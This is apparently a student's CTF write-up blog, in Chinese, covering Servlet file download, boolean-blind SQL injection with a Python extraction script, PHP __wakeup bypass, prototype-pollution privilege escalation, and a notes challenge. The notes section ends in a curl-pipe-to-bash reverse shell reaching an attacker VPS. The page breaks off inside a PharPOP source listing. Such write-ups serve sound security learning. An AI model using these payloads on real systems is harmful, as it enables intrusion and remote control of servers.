Servlet。是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。</span><br><span class="line"></span><br><span class="line">&gt;web.xml文档中配置映射关系</span><br><span class="line">《servlet》</span><br><span class="line">   《servlet-name》自定义名称《/servlet-name》 //3</span><br><span class="line">   《servlet-class》处理请求的类的完整路径《/servlet-class》 //4</span><br><span class="line">《/servlet》 </span><br><span class="line">《servlet-mapping》《!-- mapping 表示映射 --&gt;》</span><br><span class="line">   《servlet-name》自定义名称《/servlet-name》 //2</span><br><span class="line">   《url-pattern》请求名《/url-pattern》 //1</span><br><span class="line">《/servlet-mapping》</span><br><span class="line">标签的执行顺序： 请求过来以后-&gt;web.xml-&gt;servlet-mapping标签中的url-pattern标签中的内容和请求名 进行匹配-&gt;匹配成功后找对应的servlet-mapping标签中的servlet-name-&gt; 去servlet标签中找和上一个servlet-name相同的name值-&gt;去找servlet标签中 的servlet-class中处理类的完整路径</span><br><span class="line">简单理解就是代码后面注释的顺序：1–&gt;2–&gt;3–&gt;4</span><br><span class="line"></span><br><span class="line">## 下载web.xml文件，发现里面有一个FlagController的类,然后下面给了处理请求的类的完整路径com.wm.ctf.FlagController，所以可以按照这个路径去下载这个类的文件/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br><span class="line">## 下载完之后去idea（java编译软件）反编译这个类，即得到flag，这里的flag显然被base64编码加密（因为==结尾），所以base64解码即可得到flag。</span><br><span class="line"></span><br><span class="line"># [CISCN2019 华北赛区 Day2 Web1]Hack World</span><br><span class="line">## 先试了试1，发现有回显，尝试1‘后确认为sql注入，然后尝试常规注入，发现有的被过滤，所以先fuzz测试一下有哪些被过滤，然后因为在输入一些字符时回显为bool（false），判断可能为布尔盲注sql注入，这个题也是直接把表名个列名都给了，所以光爆破一个数据即可</span><br><span class="line">if(substr(ascii(select(flag)from(flag))),x,1),1,2)    （空格被过滤了，所以用括号代替）</span><br><span class="line"></span><br><span class="line">## 布尔盲注就是利用if（条件，输出1，输出2）语句来判断是否满足条件，所以要找到2种不同的回显作为if的输出，既然1的回显不同，不妨试试2的（不过用1和除了1,2之外的回显bool（false）也是可以的），不过既然1和2的回显不一样，就用1,2当做if语句的输出，然后这种大工作量的直接用BP一个一个爆破或者py脚本爆破就好，自己试还是太麻烦了。</span><br><span class="line">## 二分法python脚本模版</span><br><span class="line">```python</span><br><span class="line">import requests   （调用一个py的用于上传网络请求的库）</span><br><span class="line">url = &quot;http://65bcf82d-b053-4f60-8864-835f438b26b4.node5.buuoj.cn:81/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">   i = i + 1</span><br><span class="line">   letf = 32</span><br><span class="line">   right = 127</span><br><span class="line">   while letf &lt; right:</span><br><span class="line">       mid = (letf+right) // 2</span><br><span class="line">       payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">       data = &#123;&quot;id&quot;:payload&#125; </span><br><span class="line">       res = requests.post(url=url, data=data).text</span><br><span class="line">       if &quot;Hello&quot; in res:   (判断回显，hello在1的回显里面而不在2的回显里面)</span><br><span class="line">           letf = mid + 1</span><br><span class="line">       else:</span><br><span class="line">           right = mid</span><br><span class="line">   if letf != 32:   （判断是否为空格，为空格则停止，不为空格则写入并输出）</span><br><span class="line">       flag += chr(letf)</span><br><span class="line">       print(flag)</span><br><span class="line">   else:</span><br><span class="line">       break</span><br></pre></td></tr></table></figure></blockquote>
<h2 id="利用这个脚本即可爆破得到flag"><a href="#利用这个脚本即可爆破得到flag" class="headerlink" title="利用这个脚本即可爆破得到flag"></a>利用这个脚本即可爆破得到flag</h2><h1 id="反序列化-原型链污染"><a href="#反序列化-原型链污染" class="headerlink" title="反序列化+原型链污染"></a>反序列化+原型链污染</h1><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><h3 id="见第20条"><a href="#见第20条" class="headerlink" title="见第20条^-^"></a>见第20条^-^</h3><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><h3 id="一个非常简单的wakeup绕过，利用当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过-wakeup-函数的执⾏。"><a href="#一个非常简单的wakeup绕过，利用当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过-wakeup-函数的执⾏。" class="headerlink" title="一个非常简单的wakeup绕过，利用当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。"></a>一个非常简单的wakeup绕过，利用当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;    (将代表属性个数的<span class="number">1</span>改为<span class="number">2</span>即可)</span><br></pre></td></tr></table></figure>
<h3 id="传入参数后拿到flag"><a href="#传入参数后拿到flag" class="headerlink" title="传入参数后拿到flag"></a>传入参数后拿到flag</h3><h1 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h1><h3 id="打开后是一个登录界面，然后下面有个注册，先去注册看看，注册里面有个is-Admin的选项，选上之后让你填邀请码，应该是类似于内部人员的选项，猜测可能要越权注册到内部人员，不过既然能注册普通账户，不妨先注册试试。"><a href="#打开后是一个登录界面，然后下面有个注册，先去注册看看，注册里面有个is-Admin的选项，选上之后让你填邀请码，应该是类似于内部人员的选项，猜测可能要越权注册到内部人员，不过既然能注册普通账户，不妨先注册试试。" class="headerlink" title="打开后是一个登录界面，然后下面有个注册，先去注册看看，注册里面有个is Admin的选项，选上之后让你填邀请码，应该是类似于内部人员的选项，猜测可能要越权注册到内部人员，不过既然能注册普通账户，不妨先注册试试。"></a>打开后是一个登录界面，然后下面有个注册，先去注册看看，注册里面有个is Admin的选项，选上之后让你填邀请码，应该是类似于内部人员的选项，猜测可能要越权注册到内部人员，不过既然能注册普通账户，不妨先注册试试。</h3><h3 id="然后注册后登录，发现有个flag，先试试提交，果然是假的，下面有个下载按钮，感觉说不定有文件下载漏洞，查看网页源代码后发现下载的是一个名为wife的元素，这个元素在前端源代码里面能修改，所以就先把刚才遇见的两个网页源代码register-html和login-html下载下来先看看，发现好像是类似于模版的东西，没有什么作用，果然还是黑盒环境。"><a href="#然后注册后登录，发现有个flag，先试试提交，果然是假的，下面有个下载按钮，感觉说不定有文件下载漏洞，查看网页源代码后发现下载的是一个名为wife的元素，这个元素在前端源代码里面能修改，所以就先把刚才遇见的两个网页源代码register-html和login-html下载下来先看看，发现好像是类似于模版的东西，没有什么作用，果然还是黑盒环境。" class="headerlink" title="然后注册后登录，发现有个flag，先试试提交，果然是假的，下面有个下载按钮，感觉说不定有文件下载漏洞，查看网页源代码后发现下载的是一个名为wife的元素，这个元素在前端源代码里面能修改，所以就先把刚才遇见的两个网页源代码register.html和login.html下载下来先看看，发现好像是类似于模版的东西，没有什么作用，果然还是黑盒环境。"></a>然后注册后登录，发现有个flag，先试试提交，果然是假的，下面有个下载按钮，感觉说不定有文件下载漏洞，查看网页源代码后发现下载的是一个名为wife的元素，这个元素在前端源代码里面能修改，所以就先把刚才遇见的两个网页源代码register.html和login.html下载下来先看看，发现好像是类似于模版的东西，没有什么作用，果然还是黑盒环境。</h3><p><img src="https://pics.lwzheng.tech/2025/01/21/678e79342b1c5.png" alt="c08cf284edfd684281f13b0622d060af.png"></p>
<h3 id="既然登录后暂时没啥可以操作的了，就去之前发现的可能存在漏洞的注册网页is-Admin选项试试吧，先试试能不能用sql注入的永真绕过邀请码，然后发现不行（这个注册环境甚至没有数据库），然后发现这个题学姐给我们题型了，反序列化或者原型链污染，反序列化肯定不太可能，这黑盒环境反序列化有点抽象了，所以猜测是原型链污染（又是完全陌生的一个名词），所以就去了解一下这个漏洞吧"><a href="#既然登录后暂时没啥可以操作的了，就去之前发现的可能存在漏洞的注册网页is-Admin选项试试吧，先试试能不能用sql注入的永真绕过邀请码，然后发现不行（这个注册环境甚至没有数据库），然后发现这个题学姐给我们题型了，反序列化或者原型链污染，反序列化肯定不太可能，这黑盒环境反序列化有点抽象了，所以猜测是原型链污染（又是完全陌生的一个名词），所以就去了解一下这个漏洞吧" class="headerlink" title="既然登录后暂时没啥可以操作的了，就去之前发现的可能存在漏洞的注册网页is Admin选项试试吧，先试试能不能用sql注入的永真绕过邀请码，然后发现不行（这个注册环境甚至没有数据库），然后发现这个题学姐给我们题型了，反序列化或者原型链污染，反序列化肯定不太可能，这黑盒环境反序列化有点抽象了，所以猜测是原型链污染（又是完全陌生的一个名词），所以就去了解一下这个漏洞吧"></a>既然登录后暂时没啥可以操作的了，就去之前发现的可能存在漏洞的注册网页is Admin选项试试吧，先试试能不能用sql注入的永真绕过邀请码，然后发现不行（这个注册环境甚至没有数据库），然后发现这个题学姐给我们题型了，反序列化或者原型链污染，反序列化肯定不太可能，这黑盒环境反序列化有点抽象了，所以猜测是原型链污染（又是完全陌生的一个名词），所以就去了解一下这个漏洞吧</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/361333.html">原型链污染</a></p>
<h3 id="大体了解原理后就来尝试一下做题吧，首先便是要弄清楚我们要污染的这个元素是什么，显而易见就是判定我们是不是is-Admin的这个参数了，所以去BP抓个包看看这个参数是什么，原来是”isAdmin”-true"><a href="#大体了解原理后就来尝试一下做题吧，首先便是要弄清楚我们要污染的这个元素是什么，显而易见就是判定我们是不是is-Admin的这个参数了，所以去BP抓个包看看这个参数是什么，原来是”isAdmin”-true" class="headerlink" title="大体了解原理后就来尝试一下做题吧，首先便是要弄清楚我们要污染的这个元素是什么，显而易见就是判定我们是不是is Admin的这个参数了，所以去BP抓个包看看这个参数是什么，原来是”isAdmin”:true"></a>大体了解原理后就来尝试一下做题吧，首先便是要弄清楚我们要污染的这个元素是什么，显而易见就是判定我们是不是is Admin的这个参数了，所以去BP抓个包看看这个参数是什么，原来是”isAdmin”:true</h3><h3 id="所以把这个参数放到原型里面，也就是在这个元素放进-proto-isAdmin-true-里（一定要记得删掉原先post请求的”isAdmin”-true后面的-），这样服务器就会将将这个参数判断为原型链的一部分，在读取时便会遍历所有链去找到isAdmin这个参数，这样在注册账号时便可以直接越权拿到Admin的权限级别了"><a href="#所以把这个参数放到原型里面，也就是在这个元素放进-proto-isAdmin-true-里（一定要记得删掉原先post请求的”isAdmin”-true后面的-），这样服务器就会将将这个参数判断为原型链的一部分，在读取时便会遍历所有链去找到isAdmin这个参数，这样在注册账号时便可以直接越权拿到Admin的权限级别了" class="headerlink" title="所以把这个参数放到原型里面，也就是在这个元素放进__proto__:{&quot;isAdmin&quot;:true}里（一定要记得删掉原先post请求的”isAdmin”:true后面的,），这样服务器就会将将这个参数判断为原型链的一部分，在读取时便会遍历所有链去找到isAdmin这个参数，这样在注册账号时便可以直接越权拿到Admin的权限级别了"></a>所以把这个参数放到原型里面，也就是在这个元素放进<code>__proto__:&#123;&quot;isAdmin&quot;:true&#125;</code>里（一定要记得删掉原先post请求的”isAdmin”:true后面的,），这样服务器就会将将这个参数判断为原型链的一部分，在读取时便会遍历所有链去找到isAdmin这个参数，这样在注册账号时便可以直接越权拿到Admin的权限级别了</h3><h3 id="不过直接提交请求报错，尝试后发现是我们还没有把秘钥这个参数去掉，去掉之后边成功注册了"><a href="#不过直接提交请求报错，尝试后发现是我们还没有把秘钥这个参数去掉，去掉之后边成功注册了" class="headerlink" title="不过直接提交请求报错，尝试后发现是我们还没有把秘钥这个参数去掉，去掉之后边成功注册了"></a>不过直接提交请求报错，尝试后发现是我们还没有把秘钥这个参数去掉，去掉之后边成功注册了</h3><p><img src="https://pics.lwzheng.tech/2025/01/21/678e7d5456dcf.png" alt="f47d7869a6d9f45e444d8e9775db697d.png"></p>
<h3 id="然后登录发现页面里的flag果然发生变化（同时wife–），提交后果然是真flag。"><a href="#然后登录发现页面里的flag果然发生变化（同时wife–），提交后果然是真flag。" class="headerlink" title="然后登录发现页面里的flag果然发生变化（同时wife–），提交后果然是真flag。"></a>然后登录发现页面里的flag果然发生变化（同时wife–），提交后果然是真flag。</h3><p><img src="https://pics.lwzheng.tech/2025/01/21/678e7d614dc8a.png" alt="959f6b5dbecea2e357f08a297a64b790.png"></p>
<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><h3 id="题目给了环境和附件，附件下载下来后发现是源代码，审计了一下之后发现就是一些增删改查数据的操作分布在不同网页，不过有一段代码感觉有漏洞利用的可能"><a href="#题目给了环境和附件，附件下载下来后发现是源代码，审计了一下之后发现就是一些增删改查数据的操作分布在不同网页，不过有一段代码感觉有漏洞利用的可能" class="headerlink" title="题目给了环境和附件，附件下载下来后发现是源代码，审计了一下之后发现就是一些增删改查数据的操作分布在不同网页，不过有一段代码感觉有漏洞利用的可能"></a>题目给了环境和附件，附件下载下来后发现是源代码，审计了一下之后发现就是一些增删改查数据的操作分布在不同网页，不过有一段代码感觉有漏洞利用的可能</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
<h3 id="这里面有一段-exec-commands-index-shell-bin-bash-，大体意思就是执行index这个变量代指的命令，同时index又是从commands里面遍历，这就让刚刚做完原型链污染的我感觉如果能污染commands的原型链，不就可以进行任意代码执行了吗。"><a href="#这里面有一段-exec-commands-index-shell-bin-bash-，大体意思就是执行index这个变量代指的命令，同时index又是从commands里面遍历，这就让刚刚做完原型链污染的我感觉如果能污染commands的原型链，不就可以进行任意代码执行了吗。" class="headerlink" title="这里面有一段 exec(commands[index], {shell:&#39;/bin/bash&#39;}，大体意思就是执行index这个变量代指的命令，同时index又是从commands里面遍历，这就让刚刚做完原型链污染的我感觉如果能污染commands的原型链，不就可以进行任意代码执行了吗。"></a>这里面有一段 <code>exec(commands[index], &#123;shell:&#39;/bin/bash&#39;&#125;</code>，大体意思就是执行index这个变量代指的命令，同时index又是从commands里面遍历，这就让刚刚做完原型链污染的我感觉如果能污染commands的原型链，不就可以进行任意代码执行了吗。</h3><h3 id="接下来就是怎么污染的问题了，问题是我们能输入的比如输入数据和修改数据都是在note-list这个类里面修改，跟commands这个类扯不上半点关系"><a href="#接下来就是怎么污染的问题了，问题是我们能输入的比如输入数据和修改数据都是在note-list这个类里面修改，跟commands这个类扯不上半点关系" class="headerlink" title="接下来就是怎么污染的问题了，问题是我们能输入的比如输入数据和修改数据都是在note_list这个类里面修改，跟commands这个类扯不上半点关系"></a>接下来就是怎么污染的问题了，问题是我们能输入的比如输入数据和修改数据都是在note_list这个类里面修改，跟commands这个类扯不上半点关系</h3><h3 id="了解后发现还有undefsafe函数的漏洞可以配合原型链污染达到污染所有链的效果"><a href="#了解后发现还有undefsafe函数的漏洞可以配合原型链污染达到污染所有链的效果" class="headerlink" title="了解后发现还有undefsafe函数的漏洞可以配合原型链污染达到污染所有链的效果"></a>了解后发现还有undefsafe函数的漏洞可以配合原型链污染达到污染所有链的效果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">    <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">    <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="这里直接将id设置为-proto-这样转入数据后就可以将所有链的-proto-author都赋值为author（raw同理），这样我们再在author这个元素里面写入我们要执行的命令不就能命令执行了吗"><a href="#这里直接将id设置为-proto-这样转入数据后就可以将所有链的-proto-author都赋值为author（raw同理），这样我们再在author这个元素里面写入我们要执行的命令不就能命令执行了吗" class="headerlink" title="这里直接将id设置为__proto__,这样转入数据后就可以将所有链的__proto__.author都赋值为author（raw同理），这样我们再在author这个元素里面写入我们要执行的命令不就能命令执行了吗"></a>这里直接将id设置为<code>__proto__</code>,这样转入数据后就可以将所有链的<code>__proto__.author</code>都赋值为author（raw同理），这样我们再在author这个元素里面写入我们要执行的命令不就能命令执行了吗</h3><h3 id="不过直接传入像ls这样的命令并没有回显，判断可能是没有打印回显到网页的命令，一开始我以为console-log就是直接输出，查询之后才知道这只是个用于调试和查看程序运行过程中的数据的命令，不会输出到网页端，这样的话又该怎么办呢"><a href="#不过直接传入像ls这样的命令并没有回显，判断可能是没有打印回显到网页的命令，一开始我以为console-log就是直接输出，查询之后才知道这只是个用于调试和查看程序运行过程中的数据的命令，不会输出到网页端，这样的话又该怎么办呢" class="headerlink" title="不过直接传入像ls这样的命令并没有回显，判断可能是没有打印回显到网页的命令，一开始我以为console.log就是直接输出，查询之后才知道这只是个用于调试和查看程序运行过程中的数据的命令，不会输出到网页端，这样的话又该怎么办呢"></a>不过直接传入像ls这样的命令并没有回显，判断可能是没有打印回显到网页的命令，一开始我以为console.log就是直接输出，查询之后才知道这只是个用于调试和查看程序运行过程中的数据的命令，不会输出到网页端，这样的话又该怎么办呢</h3><h3 id="看了别人的WP发现还可以反弹shell（反弹-shell-是指目标主机主动向攻击者的主机发起连接，然后攻击者利用这个连接与目标主机进行交互。与之相对的是绑定-shell，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。）"><a href="#看了别人的WP发现还可以反弹shell（反弹-shell-是指目标主机主动向攻击者的主机发起连接，然后攻击者利用这个连接与目标主机进行交互。与之相对的是绑定-shell，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。）" class="headerlink" title="看了别人的WP发现还可以反弹shell（反弹 shell 是指目标主机主动向攻击者的主机发起连接，然后攻击者利用这个连接与目标主机进行交互。与之相对的是绑定 shell，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。）"></a>看了别人的WP发现还可以反弹shell（反弹 shell 是指目标主机主动向攻击者的主机发起连接，然后攻击者利用这个连接与目标主机进行交互。与之相对的是绑定 shell，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。）</h3><h3 id="这里我们就可以利用我们可以控制命令执行来写入shell进行监听目标，利用Curl配合Bash反弹shell，首先我们先有一个自己的VPS（虚拟服务器）（好像必须要云服务器，我的本地接收不到shell），然后在网站目录下放一个shell-txt文件，在里面写上Bash命令bash-i-dev-tcp-IP-9999-0-1-IP要写我们进行监听的IP，端口9999可以用自己喜欢的"><a href="#这里我们就可以利用我们可以控制命令执行来写入shell进行监听目标，利用Curl配合Bash反弹shell，首先我们先有一个自己的VPS（虚拟服务器）（好像必须要云服务器，我的本地接收不到shell），然后在网站目录下放一个shell-txt文件，在里面写上Bash命令bash-i-dev-tcp-IP-9999-0-1-IP要写我们进行监听的IP，端口9999可以用自己喜欢的" class="headerlink" title="这里我们就可以利用我们可以控制命令执行来写入shell进行监听目标，利用Curl配合Bash反弹shell，首先我们先有一个自己的VPS（虚拟服务器）（好像必须要云服务器，我的本地接收不到shell），然后在网站目录下放一个shell.txt文件，在里面写上Bash命令bash -i &gt;&amp; /dev/tcp/IP/9999 0&gt;&amp;1(IP要写我们进行监听的IP，端口9999可以用自己喜欢的)"></a>这里我们就可以利用我们可以控制命令执行来写入shell进行监听目标，利用Curl配合Bash反弹shell，首先我们先有一个自己的VPS（虚拟服务器）（好像必须要云服务器，我的本地接收不到shell），然后在网站目录下放一个shell.txt文件，在里面写上Bash命令<code>bash -i &gt;&amp; /dev/tcp/IP/9999 0&gt;&amp;1</code>(IP要写我们进行监听的IP，端口9999可以用自己喜欢的)</h3><p><img src="https://pics.lwzheng.tech/2025/01/21/678fb47361ff6.png" alt="447f380d01c3a5e652b40ed61eca9ed8.png"></p>
<h3 id="然后用netcat进行监听端口9999-nc-lvvp-9999-，最后在题目网站中的edit-note页面POST我们的数据id-proto-author-curl-20http-IP-shell-txt-bash-raw-a-原理就是在命令执行时利用linux的通道-来将访问我们网页里面的shell-txt获得的信息通过管道-传入bash中，从而达到让bash执行连接到我们设定的ip下的端口的命令，这样我们就能进行监听和对方服务器下的直接的命令执行了-，之后大部分页面都会报错，这里应该是我们给所有类都污染导致的，不用理会，直接去访问-status让我们注入的代码运行就好了"><a href="#然后用netcat进行监听端口9999-nc-lvvp-9999-，最后在题目网站中的edit-note页面POST我们的数据id-proto-author-curl-20http-IP-shell-txt-bash-raw-a-原理就是在命令执行时利用linux的通道-来将访问我们网页里面的shell-txt获得的信息通过管道-传入bash中，从而达到让bash执行连接到我们设定的ip下的端口的命令，这样我们就能进行监听和对方服务器下的直接的命令执行了-，之后大部分页面都会报错，这里应该是我们给所有类都污染导致的，不用理会，直接去访问-status让我们注入的代码运行就好了" class="headerlink" title="然后用netcat进行监听端口9999(nc -lvvp 9999)，最后在题目网站中的edit_note页面POST我们的数据id=__proto__&amp;author=curl%20http://IP/shell.txt|bash&amp;raw=a(原理就是在命令执行时利用linux的通道|来将访问我们网页里面的shell.txt获得的信息通过管道|传入bash中，从而达到让bash执行连接到我们设定的ip下的端口的命令，这样我们就能进行监听和对方服务器下的直接的命令执行了)，之后大部分页面都会报错，这里应该是我们给所有类都污染导致的，不用理会，直接去访问&#x2F;status让我们注入的代码运行就好了"></a>然后用netcat进行监听端口9999(<code>nc -lvvp 9999</code>)，最后在题目网站中的edit_note页面POST我们的数据<code>id=__proto__&amp;author=curl%20http://IP/shell.txt|bash&amp;raw=a</code>(原理就是在命令执行时利用linux的通道|来将访问我们网页里面的shell.txt获得的信息通过管道|传入bash中，从而达到让bash执行连接到我们设定的ip下的端口的命令，这样我们就能进行监听和对方服务器下的直接的命令执行了)，之后大部分页面都会报错，这里应该是我们给所有类都污染导致的，不用理会，直接去访问&#x2F;status让我们注入的代码运行就好了</h3><p><img src="https://pics.lwzheng.tech/2025/01/21/678fb4672885c.png" alt="0573dec69714d407f61e493bb6487618.png"></p>
<h3 id="之后就去拿flag即可"><a href="#之后就去拿flag即可" class="headerlink" title="之后就去拿flag即可"></a>之后就去拿flag即可</h3><h1 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> &lt; ?php</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span 